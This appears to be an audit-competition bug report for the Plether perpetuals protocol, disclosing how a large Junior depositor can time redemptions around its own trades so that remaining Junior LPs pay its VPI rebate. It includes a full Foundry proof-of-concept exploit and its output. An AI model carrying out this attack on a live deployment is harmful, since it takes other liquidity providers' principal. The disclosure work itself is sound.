# \#97724 [SC-Critical] Redeeming Junior shares before closing one's own position makes the remaining Junior LPs pay back its VPI

**Submitted on Nov 2nd 2026 at 21:01:53 UTC by @marcin37 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97724
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

An actor holding most of the Junior tranche opens a skew-increasing position, redeems its Junior shares, and closes after the redemption is funded. LP NAV books the open's VPI as Junior revenue but reserves nothing for the rebate the position collects at close, so the actor exits with its share of the charge and the remaining Junior LPs pay the rebate. With release parameters and a 12M USDG deposit (80% of Junior), eight 3-hour cycles cost incumbent Junior LPs 78,743 USDG of principal and leave the actor 49,977 USDG ahead.

## Root cause

LP entry and exit price Junior from one terminal NAV, pool assets minus trader claims plus the marked price delta ([`buildReconcileSnapshot`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78)), with no VPI term. The [settlement sidecar](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L464) books an open's VPI as Junior revenue:

```solidity
uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
if (poolCashInflowAssets > 0) {
    IHousePool(host.pool())
        .recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
}
```

At close, [`buildCloseState`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118) computes a rebate clamped only to the VPI the position accrued, and the sidecar [pays it from pool cash](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624):

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
...
IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
```

`settleLpEpoch` [reconciles before it prices redemptions](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L840), so a redemption funded between the open and the close pays the redeemer its share of a charge the pool later refunds. [SECURITY.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L863) keeps VPI outside the NAV price book by design but does not list this effect among its known limitations. The clamp, which its comment says stops "LP sandwich attacks", limits the rebate's size, not who pays it.

The AI scan's "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" and "Temporary pool liquidity can reduce a skew-increasing close charge" change VPI through depth. Here the first close's rebate is not larger (12,983 against 12,990 USDG in the control).

## Attack path

Conditions: release parameters (VPI factor 0.01, skew cap 40%), a live market, and incumbents with 7M USDG Senior and 3M USDG Junior. The actor brings 250,000 USDG of trading collateral. Each 3-hour cycle:

1. Deposit 12M USDG into Junior; the next epoch activates it (80% of Junior).
2. Commit and execute an 8.5M USDG LONG (38.6% of the 22M USDG depth), paying 16,420.45 USDG of VPI.
3. After the 1-hour cooldown, request redemption of all Junior shares.
4. The next epoch's `settleLpEpoch` funds it at a NAV that includes the VPI.
5. Close. The pool pays a 12,983 USDG net rebate, borne by the remaining Junior LPs.

The actor executes its own orders and LP settlement is permissionless, so nobody can block a cycle. At a constant price the deposit comes back in full every cycle (smallest redemption 12,013,034 USDG). Price PnL enters the same NAV at entry and exit, so a price move changes the actor's risk, not the transfer.

## Impact

**Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.** Incumbent Junior LPs end below their principal, and the difference reaches the actor:

| USDG, after 8 cycles (24 hours) | Control | Attack |
| --- | --- | --- |
| Actor net result | −33,510.55 | +49,976.50 |
| Incumbent Junior LP value change | +4,744.20 | −78,742.83 |
| Senior LP value change | +1,566.36 | +1,566.36 |

The actor's 83,487 USDG gain over the control equals the incumbents' loss, its Junior share of every rebate. The rebates leave the pool as cash and no function returns them. Each day of cycles takes 2.6% of the incumbents' principal.

A smaller stake works too: with 3M USDG, the size of the incumbents' Junior, the actor ends at +5,869 instead of −24,587 USDG, and incumbents at −23,436 instead of +7,021 USDG. At the release Senior cap, one cycle moves about 42,000 USDG (extrapolated, not run).

## Recommendation

Count VPI that open positions can still reclaim as a liability in the NAV used for LP entry and exit, or reserve it until the position closes. The PoC's attack should then leave the actor no better off than the control.


## Proof of Concept

Runs in the competition repository at `a82d4fe` on its `BasePerpTest` fixture (in-scope contracts, mock USDG and Pyth). `setUp` sets and asserts the release parameters from `DEPLOYMENT.md`, including the owner's timelocked Senior caps, then enters 7M USDG Senior and 3M USDG Junior.

Each run is eight cycles: the actor deposits into Junior, opens a LONG through `OrderRouter.commitOrder` and `executeOrder`, redeems after the cooldown and closes, while a keeper settles each epoch with `settleLpEpoch`. The control closes before each redemption is funded and the attack right after, at identical timestamps and a constant 1.00 price, with a 12M USDG deposit (80% of Junior) and again with 3M (50%).

Cheatcodes: `vm.snapshotState`/`vm.revertToState` between runs, `vm.warp`/`vm.roll` for epochs, and `vm.prank` for each account's own calls; mock USDG is minted. No protocol storage writes; the fixture's router is the production `OrderRouter` plus a legacy overload the test does not call.

## Run

Foundry 1.7.1, with forge-std from the repository's submodule. The first via-IR compile takes about 90 seconds.

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
# save the code below as packages/perps/test/perps/poc/VpiLpExitTiming.t.sol
FOUNDRY_TEST=test/perps/poc forge test --root packages/perps --match-path test/perps/poc/VpiLpExitTiming.t.sol -vv
```

## Output

```text
Ran 1 test for test/perps/poc/VpiLpExitTiming.t.sol:VpiLpExitTimingTest
[PASS] test_JuniorExitBeforeOwnCloseMakesIncumbentsPayVpiRebate() (gas: 160938172)
Logs:
  Actor Junior deposit, USDG: 12000000.000000
  Actor trading collateral, USDG: 250000.000000
  Actor share of Junior at the first open, %: 80.00
  VPI charged by the first open, USDG: 16420.453052
  Pool cash paid by the first close, USDG, control / attacked: 12989.602671 12983.267444
  Smallest Junior redemption in the attack, USDG: 12013034.133068
  Cycles: 8
  Elapsed, hours: 24
  Actor net result, USDG, control / attacked: -33510.554039 49976.503971
  Incumbent Junior LP value change, USDG, control / attacked: 4744.196480 -78742.833719
  Senior LP value change, USDG, control / attacked: 1566.355755 1566.355755
  3M USDG deposit, actor net result, USDG, control / attacked: -24587.241075 5869.308356
  3M USDG deposit, incumbent Junior LP value change, USDG, control / attacked: 7020.882758 -23435.656528
```

## Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineRiskParamsView} from "@plether/perps/interfaces/ICfdEngineRiskParamsView.sol";

/// @notice Eight 3-hour cycles: the actor deposits into Junior, opens a skew-increasing LONG, redeems its Junior shares
///         and closes after the redemption is funded, so the remaining Junior LPs pay its VPI rebate. Control: the same
///         deposits, orders, prices and epochs, with each close before the redemption is funded. Run at 80% and 50% of
///         Junior. Release parameters from packages/perps/DEPLOYMENT.md; production OrderRouter, mocked Pyth at 1.00.
contract VpiLpExitTimingTest is BasePerpTest {

    address internal constant SENIOR_LP = address(0x5E01);
    address internal constant JUNIOR_LP = address(0x1A01);
    address internal constant ACTOR = address(0xA77AC);
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant INCUMBENT_SENIOR = 7_000_000e6; // 70% Senior, inside the 80% release share cap
    uint256 internal constant INCUMBENT_JUNIOR = 3_000_000e6;
    uint256 internal constant ACTOR_TRADING_FUNDS = 250_000e6;
    uint256 internal constant PRICE = 1e8; // basket mark, unchanged for the whole scenario
    uint256 internal constant CYCLES = 8; // each cycle spans three hourly LP epochs

    struct Stake {
        uint256 deposit; // the actor's Junior deposit, every cycle
        uint256 size; // LONG notional: 38.6% of the depth after the deposit, under the 40% skew cap
        uint256 margin; // 0.7% of notional, above the 0.2% initial margin
    }

    struct Outcome {
        uint256 firstShareBps;
        uint256 firstVpi;
        uint256 firstNetRebate;
        uint256 minRedemption;
        uint256 expectedTransfer;
        uint256 elapsed;
        int256 actorPnl;
        int256 incumbentJuniorChange;
        int256 seniorChange;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        // The release HousePool wrapper installs these caps in its constructor; here the owner sets them once.
        _setSeniorCapacity(40_000_000e6, 8000);
        _lpDeposit(juniorVault, JUNIOR_LP, INCUMBENT_JUNIOR);
        _lpDeposit(seniorVault, SENIOR_LP, INCUMBENT_SENIOR);

        CfdTypes.RiskParams memory params = ICfdEngineRiskParamsView(address(engine)).riskParams();
        assertEq(params.vpiFactor, 0.01e18);
        assertEq(params.maxSkewRatio, 0.4e18);
        assertEq(params.maintMarginBps, 10);
        assertEq(params.initMarginBps, 20);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(engine.CAP_PRICE(), 2e8);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(pool.seniorRateBps(), 800);
        assertEq(juniorVault.maintenanceFeeAprBps(), 0);
        assertTrue(pool.isTradingActive());
    }

    function test_JuniorExitBeforeOwnCloseMakesIncumbentsPayVpiRebate() public {
        Stake memory large = Stake(12_000_000e6, 8_500_000e18, 60_000e6); // 80% of Junior, 22M depth
        Stake memory small = Stake(3_000_000e6, 5_000_000e18, 35_000e6); // 50% of Junior, 13M depth

        uint256 start = vm.snapshotState();
        Outcome memory control = _run(large, false);
        vm.revertToState(start);
        Outcome memory attacked = _run(large, true);
        vm.revertToState(start);
        Outcome memory smallControl = _run(small, false);
        vm.revertToState(start);
        Outcome memory smallAttacked = _run(small, true);

        emit log_named_decimal_uint("Actor Junior deposit, USDG", large.deposit, 6);
        emit log_named_decimal_uint("Actor trading collateral, USDG", ACTOR_TRADING_FUNDS, 6);
        emit log_named_decimal_uint("Actor share of Junior at the first open, %", attacked.firstShareBps, 2);
        emit log_named_decimal_uint("VPI charged by the first open, USDG", attacked.firstVpi, 6);
        _pair("Pool cash paid by the first close, USDG", control.firstNetRebate, attacked.firstNetRebate);
        emit log_named_decimal_uint("Smallest Junior redemption in the attack, USDG", attacked.minRedemption, 6);
        emit log_named_uint("Cycles", CYCLES);
        emit log_named_uint("Elapsed, hours", attacked.elapsed / 1 hours);
        _pair("Actor net result, USDG", control.actorPnl, attacked.actorPnl);
        _pair("Incumbent Junior LP value change, USDG", control.incumbentJuniorChange, attacked.incumbentJuniorChange);
        _pair("Senior LP value change, USDG", control.seniorChange, attacked.seniorChange);
        _pair("3M USDG deposit, actor net result, USDG", smallControl.actorPnl, smallAttacked.actorPnl);
        _pair(
            "3M USDG deposit, incumbent Junior LP value change, USDG",
            smallControl.incumbentJuniorChange,
            smallAttacked.incumbentJuniorChange
        );

        assertEq(control.firstVpi, attacked.firstVpi, "same first open in both runs");
        assertLe(attacked.firstNetRebate, control.firstNetRebate, "the attack does not enlarge the close rebate");
        assertApproxEqAbs(attacked.firstShareBps, 8000, 1, "actor owns 80% of Junior when its VPI lands");
        assertGe(attacked.minRedemption, large.deposit, "the deposit comes back in full every cycle");
        assertLt(control.actorPnl, 0, "control: the actor only pays fees");
        assertGt(attacked.actorPnl, 0, "attack: the actor ends with more USDG than it brought");
        assertGe(control.incumbentJuniorChange, 0, "control: incumbent Junior is not harmed");
        assertLt(attacked.incumbentJuniorChange, 0, "attack: incumbent Junior loses principal");
        assertApproxEqAbs(control.seniorChange, attacked.seniorChange, 1e6, "Senior is unaffected either way");

        int256 actorGain = attacked.actorPnl - control.actorPnl;
        int256 incumbentLoss = control.incumbentJuniorChange - attacked.incumbentJuniorChange;
        assertApproxEqAbs(actorGain, incumbentLoss, 10e6, "the actor's gain is the incumbents' loss");
        assertApproxEqRel(
            uint256(actorGain),
            attacked.expectedTransfer,
            0.005e18,
            "transfer is the actor's Junior share of each rebate"
        );

        assertApproxEqAbs(smallAttacked.firstShareBps, 5000, 1, "the small stake is 50% of Junior");
        assertLt(smallControl.actorPnl, 0, "control at 50%: the actor only pays fees");
        assertGt(smallAttacked.actorPnl, 0, "attack at 50%: still profitable");
        assertGe(smallControl.incumbentJuniorChange, 0, "control at 50%: incumbent Junior is not harmed");
        assertLt(smallAttacked.incumbentJuniorChange, 0, "attack at 50%: incumbent Junior loses principal");
    }

    function _run(
        Stake memory stake,
        bool closeAfterExit
    ) internal returns (Outcome memory outcome) {
        uint256 incumbentShares = juniorVault.balanceOf(JUNIOR_LP);
        uint256 seniorShares = seniorVault.balanceOf(SENIOR_LP);
        uint256 incumbentBefore = juniorVault.convertToAssets(incumbentShares);
        uint256 seniorBefore = seniorVault.convertToAssets(seniorShares);
        uint256 startTime = vm.getBlockTimestamp();

        _fundTrader(ACTOR, ACTOR_TRADING_FUNDS);
        settlementToken.mint(ACTOR, stake.deposit);
        outcome.minRedemption = type(uint256).max;
        uint256 redeemId;
        for (uint256 i; i < CYCLES; ++i) {
            uint256 shares = _actorDeposit(stake.deposit);
            uint256 supply = juniorVault.totalSupply();
            assertLt(stake.size * PRICE / 1e20, pool.totalAssets() * 4 / 10, "open stays under the 40% skew cap");
            _execute(_commit(stake.size, stake.margin, false));
            (uint256 size,,,,,, int256 vpiAccrued) = engine.positions(ACTOR);
            assertEq(size, stake.size, "open executed");

            vm.warp(juniorVault.lastDepositTime(ACTOR) + juniorVault.DEPOSIT_COOLDOWN());
            vm.prank(ACTOR);
            redeemId = juniorVault.requestRedeem(shares, ACTOR, ACTOR);
            uint256 netRebate;
            if (!closeAfterExit) {
                netRebate = _closePosition(stake.size);
            }
            vm.warp(pool.lpEpochStart(redeemId));
            _keeperSettle();
            if (closeAfterExit) {
                netRebate = _closePosition(stake.size);
            }

            assertEq(juniorVault.claimableRedeemRequest(redeemId, ACTOR), shares, "whole redemption funded");
            vm.prank(ACTOR);
            uint256 redeemed = juniorVault.claimRedeem(redeemId, shares, ACTOR, ACTOR);
            if (redeemed < outcome.minRedemption) {
                outcome.minRedemption = redeemed;
            }
            outcome.expectedTransfer += netRebate * shares / supply;
            if (i == 0) {
                outcome.firstShareBps = shares * 10_000 / supply;
                outcome.firstVpi = uint256(vpiAccrued);
                outcome.firstNetRebate = netRebate;
            }
        }
        uint256 free = clearinghouse.getAccountAssetBuckets(ACTOR).freeSettlementAssets;
        vm.prank(ACTOR);
        clearinghouse.withdraw(ACTOR, free);
        outcome.actorPnl = int256(settlementToken.balanceOf(ACTOR)) - int256(stake.deposit + ACTOR_TRADING_FUNDS);

        // Value every run at the same time: 30 minutes into the epoch that funded the last redemption.
        vm.warp(pool.lpEpochStart(redeemId) + 30 minutes);
        outcome.elapsed = vm.getBlockTimestamp() - startTime;
        outcome.incumbentJuniorChange = int256(juniorVault.convertToAssets(incumbentShares)) - int256(incumbentBefore);
        outcome.seniorChange = int256(seniorVault.convertToAssets(seniorShares)) - int256(seniorBefore);
    }

    function _actorDeposit(
        uint256 assets
    ) internal returns (uint256 shares) {
        vm.startPrank(ACTOR);
        settlementToken.approve(address(juniorVault), assets);
        uint256 requestId = juniorVault.requestDeposit(assets, ACTOR, ACTOR);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(requestId));
        _keeperSettle();
        vm.prank(ACTOR);
        shares = juniorVault.claimDeposit(requestId, assets, ACTOR, ACTOR);
    }

    function _closePosition(
        uint256 size
    ) internal returns (uint256 poolPaid) {
        assertFalse(engine.isOracleFrozen() || engine.isFadWindow(), "ordinary live market");
        uint256 poolCashBefore = pool.accountedAssets();
        _execute(_commit(size, 0, true));
        (uint256 remaining,,,,,,) = engine.positions(ACTOR);
        assertEq(remaining, 0, "close executed");
        poolPaid = poolCashBefore - pool.accountedAssets();
    }

    function _lpDeposit(
        TrancheVault vault,
        address lp,
        uint256 assets
    ) internal {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        vm.warp(vault.depositEpochStart(requestId));
        _keeperSettle();
        vm.prank(lp);
        vault.claimDeposit(requestId, assets, lp, lp);
    }

    function _keeperSettle() internal {
        bytes[] memory update = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(update);
    }

    function _commit(
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: CfdTypes.Side.LONG,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(ACTOR);
        orderId = router.commitOrder(request);
    }

    function _execute(
        uint64 orderId
    ) internal {
        bytes[] memory update = _mockPythUpdateData(PRICE);
        // Execution is permissionless; the actor runs its own keeper and collects its own open bounty.
        vm.prank(ACTOR);
        router.executeOrder(orderId, update);
    }

    function _pair(
        string memory label,
        uint256 control,
        uint256 attacked
    ) internal {
        _pair(label, int256(control), int256(attacked));
    }

    function _pair(
        string memory label,
        int256 control,
        int256 attacked
    ) internal {
        emit log(string.concat(label, ", control / attacked: ", _usdg(control), " ", _usdg(attacked)));
    }

    function _usdg(
        int256 amount
    ) internal pure returns (string memory) {
        uint256 abs = amount < 0 ? uint256(-amount) : uint256(amount);
        string memory fraction = vm.toString(abs % 1e6);
        while (bytes(fraction).length < 6) {
            fraction = string.concat("0", fraction);
        }
        return string.concat(amount < 0 ? "-" : "", vm.toString(abs / 1e6), ".", fraction);
    }

}
```

